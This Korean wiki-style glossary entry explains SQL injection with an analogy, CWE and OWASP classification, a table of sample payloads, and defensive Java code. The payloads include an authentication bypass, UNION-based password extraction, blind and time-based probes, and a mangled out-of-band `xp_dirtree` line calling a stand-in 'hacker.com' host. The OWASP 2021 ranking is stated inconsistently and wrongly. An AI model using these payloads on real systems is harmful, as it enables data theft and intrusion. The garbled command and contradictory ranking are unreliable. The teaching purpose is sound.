---
title: SQL Injection — 보안 용어 해설
created: 2026-06-10
updated: 2026-06-10
type: concept
tags: [security, glossary, web, injection, vulnerability, owasp, database]
sources: []
confidence: high
---

# SQL Injection — 보안 용어 해설

## Step 1: 의미 풀이 및 쉬운 비유

### 용어 풀이

| 단어 | 뜻 |
|------|-----|
| **SQL** | **S**tructured **Q**uery **L**anguage — 데이터베이스에 질문하는 언어 |
| **Injection** | **주입** — 무언가를 몰래 집어넣는 행위 |

**의미 조합**: "데이터베이스에 보내는 질문(SQL)에 악성 명령어를 몰래 주입(Injection)하는 공격 기법"

### 강력한 비유 — "도서관 사서를 속이는 가짜 도서 대출증"

#### 상황

도서관에서는 **정해진 양식(도서 대출증)** 만 있으면 누구나 책을 빌릴 수 있습니다. 일반 손님들은 빈칸에 **정확한 정보**만 적어서 제출합니다.

#### 공격

해커는 대출증의 **"대출 희망 도서"** 란에 책 제목만 쓰지 않고, **"'어린왕자'를 대출합니다; 그리고 동시에 모든 대출 기록을 보여주세요"** 라고 적어서 제출합니다. **사서는 앞부분만 보고 도서 대출 양식이라고 믿고 그대로 실행**합니다.

#### 결과

해커는 책 한 권을 빌리는 척하면서 **도서관의 모든 대출 기록(개인정보)** 을 빼내게 됩니다.

### 시나리오 매핑

| 비유 요소 | 실제 개념 |
|-----------|----------|
| 도서관 | 데이터베이스 서버 |
| 사서 | 데이터베이스 엔진 |
| 대출증 양식 | SQL 쿼리 템플릿 |
| 추가 명령어 | 악성 SQL 페이로드 |
| 모든 대출 기록 | 다른 사용자의 개인정보 |
| 사서가 검증 없이 실행 | 입력값을 SQL에 직접 연결 |

---

## Step 2: 개념 시각화 (건너뜀)

> [시스템 알림] 이미지 생성 도구(ComfyUI)가 설치되어 있지 않아 시각화 이미지 생성 단계를 생략합니다.

---

## Step 3: 전문 용어 설명

### 정의

**SQL 인젝션 (SQL Injection)** 은 웹 애플리케이션에서 가장 위험한 취약점 중 하나로, **사용자의 입력값이 SQL 쿼리의 일부로 직접 삽입될 때 발생하는 공격**입니다. 공격자는 악의적으로 조작된 입력값을 통해 데이터베이스의 쿼리 구조를 변경하거나 추가 명령을 실행할 수 있습니다.

### CWE 분류

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### OWASP Top 10

- 2021년: **1위 (A01: Broken Access Control)** — SQL Injection은 여전히 가장 치명적인 취약점 중 하나
- 2017년: **1위 (A1: Injection)**

### 공격 원리

SQL Injection의 핵심은 **쿼리 문자열과 사용자 입력값이 분리되지 않는 것**입니다. 예를 들어:

```sql
-- 취약한 코드 예시
SELECT * FROM users WHERE id = '$user_input';
```

공격자가 `user_input`에 `1' OR '1'='1` 을 입력하면:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1';
-- 조건이 항상 참 → 모든 사용자 정보 조회됨
```

### 공격 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **In-band (Error-based)** | 동일한 채널로 결과와 에러 정보 수집 | `' OR 1=1 --` |
| **Union-based** | `UNION` 키워드로 추가 쿼리 결과 반환 | `' UNION SELECT username,password FROM users --` |
| **Blind (Boolean-based)** | 참/거짓 응답 차이로 정보 추론 | `' AND SUBSTRING(password,1,1)='a' --` |
| **Blind (Time-based)** | 응답 지연으로 정보 추론 | `'; WAITFOR DELAY '0:0:5' --` |
| **Out-of-band** | 다른 채널(DNS, HTTP)로 데이터 탈취 | `'; EXEC xp_dirtree '\hacker.comile' --` |
| **Second Order** | 저장된 데이터가 나중에 쿼리될 때 실행 | 프로필에 악성 쿼리 저장 후 관리자 조회 시 실행 |

### 주요 공격 목표

- **인증 우회**: 패스워드 없이 로그인 (`' OR '1'='1`)
- **데이터 탈취**: 다른 사용자의 개인정보, 패스워드 해시 조회
- **데이터 변조/삭제**: `DROP`, `UPDATE` 명령어 주입
- **권한 상승**: 데이터베이스 관리자 권한 획득
- **원격 명령 실행**: `xp_cmdshell` 등 OS 명령어 실행 (MSSQL)

### 방어 방법

| 기법 | 설명 | 효과 |
|------|------|------|
| **Prepared Statement (Parameterized Query)** | SQL 쿼리 템플릿과 입력값을 분리 | **가장 확실한 방어** |
| **ORM 사용** | MyBatis, JPA, SQLAlchemy 등이 자동 파라미터 바인딩 | Prepared Statement와 동일 |
| **입력값 검증** | 화이트리스트 방식으로 허용된 값만 수락 | 보조 방어 |
| **최소 권한 원칙** | DB 계정에 필요한 권한만 부여 (DROP/Xp_cmdshell 금지) | 피해 최소화 |
| **Stored Procedure** | 저장 프로시저 사용 (단, 내부가 안전해야 함) | 부분적 방어 |
| **WAF (Web Application Firewall)** | SQL Injection 패턴 탐지 및 차단 | 네트워크 레벨 방어 |

### 방어 코드 예시 (Java)

```java
// ❌ 취약한 코드
String query = "SELECT * FROM users WHERE id = '" + userInput + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ✅ 안전한 코드 (PreparedStatement)
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userInput);
ResultSet rs = pstmt.executeQuery();
```

### SQL Injection 자가 진단 체크리스트

- [ ] 사용자 입력값이 SQL 쿼리 문자열에 직접 연결되어 있는가?
- [ ] Prepared Statement나 ORM을 사용하고 있는가?
- [ ] 에러 메시지가 사용자에게 그대로 노출되는가?
- [ ] DB 계정에 불필요한 고권한이 부여되어 있는가?
- [ ] 입력값에 대한 서버 측 검증이 이루어지고 있는가?

### 요약

| 구분 | 내용 |
|------|------|
| **CVE/CWE 분류** | CWE-89 |
| **OWASP Top 10** | 2021: 1위 (Injection) |
| **공격 난이도** | 낮음 ~ 중간 |
| **영향도** | **매우 높음** — 전체 DB 데이터 탈취/변조/삭제 가능 |
| **최선의 방어** | Prepared Statement + 입력값 검증 + 최소 권한 |

### 관련 개념
- [[xss]] (인젝션 계열 취약점 비교)
- [[prompt-injection-ctf]] (인젝션의 다른 형태)
- [[ai-ctf-overview]] (CTF에서 SQL Injection 문제 유형)

---

**출처**: 한국어 위키백과 — [SQL 삽입](https://ko.wikipedia.org/wiki/SQL_%EC%82%BD%EC%9E%85)
